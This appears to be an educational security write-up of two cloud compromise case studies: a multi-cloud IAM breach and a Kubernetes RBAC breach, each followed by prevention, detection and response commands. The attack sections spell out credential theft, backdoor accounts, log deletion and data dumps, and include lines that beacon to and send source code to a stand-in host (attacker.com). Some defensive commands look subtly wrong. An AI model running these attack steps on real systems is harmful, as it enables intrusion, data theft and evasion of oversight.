# Real-World Cloud Compromise Case Studies

## Case Study 1: Multi-Cloud Data Breach via Misconfigured IAM

### Scenario
A company uses AWS, Azure, and GCP for different workloads. Security team misconfigured IAM permissions, allowing a former contractor with residual access to compromise all three clouds simultaneously.

### Attack Timeline

#### Week 1: Initial Reconnaissance (Monday)
```bash
# 1. Former contractor retained AWS credentials from previous role
aws s3 ls  # Works! Access not revoked

# 2. Enumerates environment
aws ec2 describe-instances --output table
aws rds describe-db-instances --output table
aws lambda list-functions --output table

# 3. Finds overly-permissive IAM role
aws iam list-attached-role-policies --role-name lambda-exec-role
# Returns: AdministratorAccess

# 4. Creates backdoor user
aws iam create-user --user-name "contractor-archive"
aws iam attach-user-policy --user-name contractor-archive --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name contractor-archive
```

#### Week 1: Credential Exfiltration (Tuesday-Wednesday)
```bash
# 5. Extracts AWS secrets
aws secretsmanager list-secrets --output table
aws secretsmanager get-secret-value --secret-id prod/rds/master > /tmp/aws-secrets.json
aws ssm describe-parameters --output table
aws ssm get-parameter --name /prod/azure_admin_password --with-decryption > /tmp/azure-creds.txt

# 6. Finds Azure credentials in S3
aws s3 cp s3://config-bucket/azure-credentials.json ./
# Retrieved file contains: Azure service principal credentials

# 7. Uses Azure credentials to access Azure environment
export AZURE_CLIENT_ID=$(jq -r .appId azure-credentials.json)
export AZURE_CLIENT_SECRET=$(jq -r .password azure-credentials.json)
export AZURE_TENANT_ID=$(jq -r .tenant azure-credentials.json)

az login --service-principal -u $AZURE_CLIENT_ID -p $AZURE_CLIENT_SECRET --tenant $AZURE_TENANT_ID

# 8. Lists Azure resources
az vm list --output table
az sql server list --output table
az storage account list --output table
```

#### Week 2: Cross-Cloud Pivot (Thursday)
```bash
# 9. Finds GCP service account key stored in Azure Key Vault
az keyvault secret show --vault-name prod-vault --name gcp-service-account --query value > gcp-sa-key.json

# 10. Authenticates to GCP
export GOOGLE_APPLICATION_CREDENTIALS=gcp-sa-key.json
gcloud auth activate-service-account --key-file=gcp-sa-key.json
gcloud config set project target-project

# 11. Discovers BigQuery with production data
bq ls
# Tables include: customers, transactions, payment_methods

# 12. Exports sensitive data
bq query --use_legacy_sql=false --format=csv \
  "SELECT customer_id, email, phone, ssn FROM customers LIMIT 100000" > customers.csv

# 13. Finds RDS database credentials
gcloud sql instances describe prod-mysql --query connectionName
aws secretsmanager get-secret-value --secret-id gcp-rds-password --query SecretString

# 14. Connects to RDS and exports database
mysql -h prod-database.c2iubh89z1qw.us-east-1.rds.amazonaws.com -u admin -p < (aws secretsmanager get-secret-value --secret-id prod/rds/master --query SecretString | jq -r '.password')

mysqldump -h prod-database.c2iubh89z1qw.us-east-1.rds.amazonaws.com -u admin -p --all-databases > database-dump.sql
```

#### Week 2-3: Persistence Installation (Friday-Weekend)
```bash
# 15. Installs AWS persistence
aws lambda create-function --function-name system-maintenance \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/lambda-exec-role \
  --handler index.handler \
  --zip-file fileb://backdoor.zip

aws events put-rule --name daily-maintenance --schedule-expression "cron(3 2 * * ? *)"
aws events put-targets --rule daily-maintenance \
  --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:system-maintenance"

# 16. Installs Azure persistence
az ad sp create-for-rbac --name system-service --role Contributor

# 17. Installs GCP persistence  
gcloud iam service-accounts create maintenance-sa --display-name="System Maintenance"
gcloud projects add-iam-policy-binding target-project \
  --member=serviceAccount:maintenance-sa@target-project.iam.gserviceaccount.com \
  --role=roles/editor
```

#### Detection Evasion (Week 3)
```bash
# 18. Covers tracks
aws cloudtrail stop-logging --trail-name production-trail

# Delete logs from compromise date
aws s3 rm s3://cloudtrail-logs/2024/01/15/ --recursive

# 19. Clears activity in Azure
az monitor diagnostic-settings delete --name activity-log-export --resource /subscriptions/{sub-id}

# 20. Disables GCP audit logs
gcloud logging sinks delete audit-logs-sink --project=target-project

# 21. Uses scheduled queries for ongoing exfiltration (harder to detect)
bq mk --transfer_config \
  --data_source=scheduled_query \
  --display_name="Daily Performance Report" \
  --target_dataset=reports \
  --params='{
    "query": "SELECT * FROM `target-project.production.customers` WHERE created_date > CURRENT_DATE() - 1",
    "destination_table_name_template": "daily_report_{run_date}",
    "write_disposition": "WRITE_TRUNCATE"
  }' \
  --schedule="every 24 hours"

# Exported data appears as legitimate analytics
```

### Damage Assessment
- **Data Exposed**: 500K+ customer records, payment methods, SSNs
- **Duration**: 3 weeks before detection
- **Locations**: AWS RDS, Azure SQL, GCP BigQuery
- **Credentials Exposed**: Database credentials, API keys, service accounts
- **Persistence**: 3 backdoor accounts active across 3 clouds
- **Financial Impact**: $2.3M incident response + legal

### How It Could Have Been Prevented

#### Week 1 Prevention
```bash
# 1. Immediately revoke former employee credentials
aws iam delete-access-key --user-name contractor --access-key-id AKIA...
az ad user delete --id {object-id}  # Remove Azure access
gcloud projects remove-iam-policy-binding --member=serviceAccount:contractor@... --role=...

# 2. Audit IAM permissions
aws iam list-users --query 'Users[].UserName' | xargs -I {} \
  aws iam list-attached-user-policies --user-name {}

# Remove AdministratorAccess from all non-admin users
aws iam detach-user-policy --user-name lambda-exec-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

#### Week 1 Detection
```bash
# 3. Alert on new user creation
aws cloudwatch put-metric-alarm \
  --alarm-name NewIAMUserCreated \
  --metric-name NewUserCount \
  --namespace CloudTrailMetrics \
  --threshold 0 \
  --comparison-operator GreaterThanThreshold

# 4. Alert on policy attachments
aws cloudwatch put-metric-alarm \
  --alarm-name PolicyAttachment \
  --metric-name PolicyChangeCount \
  --threshold 0 \
  --comparison-operator GreaterThanThreshold

# 5. Real-time monitoring
aws logs create-log-group --log-group-name /aws/security/alerts
aws logs create-subscription-filter \
  --log-group-name /aws/cloudtrail/events \
  --filter-name NewUserAlert \
  --filter-pattern '{ ($.eventName = "CreateUser") }' \
  --destination-arn arn:aws:logs:...
```

#### Weeks 1-3 Prevention (Hardening)
```bash
# 6. Enforce credential rotation
aws iam create-account-password-policy \
  --max-password-age 90 \
  --password-reuse-prevention 24

# 7. Require MFA for sensitive operations
cat > mfa-required-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Principal": "*",
    "Action": [
      "iam:DeleteUser",
      "iam:AttachUserPolicy",
      "iam:DeleteAccessKey"
    ],
    "Resource": "*",
    "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "false"}}
  }]
}
EOF

# 8. Limit S3 access
aws s3api put-bucket-policy --bucket config-bucket --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::config-bucket/*",
    "Condition": {"StringLike": {"aws:SourceIp": ["203.0.113.0/24"]}}
  }]
}'

# 9. Segment databases
# RDS security group should only allow from application tier
aws ec2 authorize-security-group-ingress \
  --group-id sg-database \
  --protocol tcp --port 3306 \
  --source-group sg-application-tier

aws ec2 revoke-security-group-ingress \
  --group-id sg-database \
  --protocol tcp --port 3306 \
  --cidr 0.0.0.0/0

# 10. Multi-cloud access control
# Require VPN for cross-cloud access
# Implement network segmentation per cloud
# Use VPC peering with strict controls
```

---

## Case Study 2: K8s Cluster Compromise via Misconfigured RBAC

### Scenario  
Kubernetes cluster with overly-permissive default service account used for deployment pipeline.

### Attack Chain

```bash
# 1. Gain access to cluster (via misconfigured RBAC)
kubectl get pods -A  # Works with default service account

# 2. Discover sensitive pods
kubectl get pods -n payment-processing
kubectl get pods -n secrets-management

# 3. Extract secrets
kubectl get secret -n payment-processing -o json | jq '.items[] | select(.data | length > 0)'

# 4. Decode secrets
kubectl get secret -n payment-processing payment-api-key -o jsonpath='{.data.key}' | base64 -d

# 5. Check service account permissions
kubectl auth can-i list secrets --as=system:serviceaccount:payment-processing:default

# 6. Escalate privileges
kubectl create rolebinding escalation --clusterrole=cluster-admin --serviceaccount=default:default

# 7. Deploy malicious pod
cat > backdoor-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
spec:
  serviceAccountName: default
  containers:
  - name: backdoor
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c", "while true; do curl https://attacker.com/beacon; sleep 3600; done"]
    volumeMounts:
    - name: docker-socket
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-socket
    hostPath:
      path: /var/run/docker.sock
EOF

kubectl apply -f backdoor-pod.yaml

# 8. Access etcd (cluster state)
kubectl get endpoints kubernetes -o jsonpath='{.subsets[0].addresses[0].ip}'
# Exploit etcd for cluster secrets

# 9. Exfiltrate application code
kubectl exec -it deployment/app -- tar czf - /app/source | curl -X POST -d @- https://attacker.com/code

# 10. Install persistence via webhook
# Create MutatingWebhookConfiguration to inject backdoor into all pods
```

### Prevention

```bash
# 1. Restrict default service account
kubectl patch serviceaccount default -p '{"automountServiceAccountToken": false}'

# 2. Create minimal RBAC roles
cat > minimal-role.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: deployment-pipeline
  namespace: deployments
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "patch"]
- apiGroups: [""]
  resources: ["services"]
  verbs: ["get", "list"]
EOF

# 3. Deny privileged pods
cat > pod-security-policy.yaml << 'EOF'
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
  - ALL
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'projected'
  - 'secret'
  hostNetwork: false
  hostIPC: false
  hostPID: false
EOF

# 4. Enable Pod Security Standards
kubectl label namespace deployments pod-security.kubernetes.io/enforce=restricted

# 5. Network policies
cat > deny-all.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF

# 6. Audit logging
--audit-log-path=/var/log/audit.log \
--audit-log-maxage=30 \
--audit-log-maxbackup=10

# 7. RBAC audit
kubectl get rolebindings -A | grep "cluster-admin"
kubectl get clusterrolebindings | grep "cluster-admin"
```

---

## Detection & Response Timeline

### Hour 0-1: Initial Detection
```bash
# Alert on unusual API activity
grep -E "CreateUser|AttachUserPolicy|CreateAccessKey" /var/log/audit.log

# Alert on data export
grep -E "GetSecret|GetParameter|ListBuckets" CloudTrail

# Alert on CloudTrail disabling
grep "StopLogging" CloudTrail
```

### Hour 1-4: Investigation & Containment
```bash
# 1. Quarantine compromised credentials
aws iam delete-access-key --user-name contractor --access-key-id AKIA...

# 2. Revoke suspicious sessions
aws sts get-caller-identity --access-key-id AKIA... > /dev/null

# 3. Kill Lambda functions
aws lambda delete-function --function-name backdoor

# 4. Remove backdoor users
aws iam delete-user --user-name contractor-archive

# 5. Reset all IAM credentials in production
for user in $(aws iam list-users --query 'Users[].UserName' --output text); do
  aws iam delete-access-key --user-name $user --access-key-id AKIA...
  aws iam create-access-key --user-name $user
done
```

### Hour 4-24: Forensics & Recovery  
```bash
# 1. Export CloudTrail logs for analysis
aws s3 sync s3://cloudtrail-logs/ ./cloudtrail-forensics/

# 2. Analyze access patterns
grep "$COMPROMISED_ACCOUNT_ID" cloudtrail-forensics/*.json | jq '.Records[]' > suspicious-activity.json

# 3. Identify data exposure
grep -l "GetObject\|Query\|Describe" suspicious-activity.json | head -20

# 4. Assess blast radius
aws s3 ls --recursive | grep "2024-01-15"  # Date of compromise
```

### Hour 24+: Recovery
```bash
# 1. Restore from clean backup
# (Daily backups of databases)
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier prod-db-restored \
  --db-snapshot-identifier prod-db-2024-01-14-clean

# 2. Verify security baseline
./security-audit.sh  # Custom compliance check

# 3. Rotate all credentials
# SSH keys, API keys, database passwords

# 4. Enable additional monitoring
aws guardduty create-detector --finding-publishing-frequency FIFTEEN_MINUTES
aws securityhub enable-security-hub
```

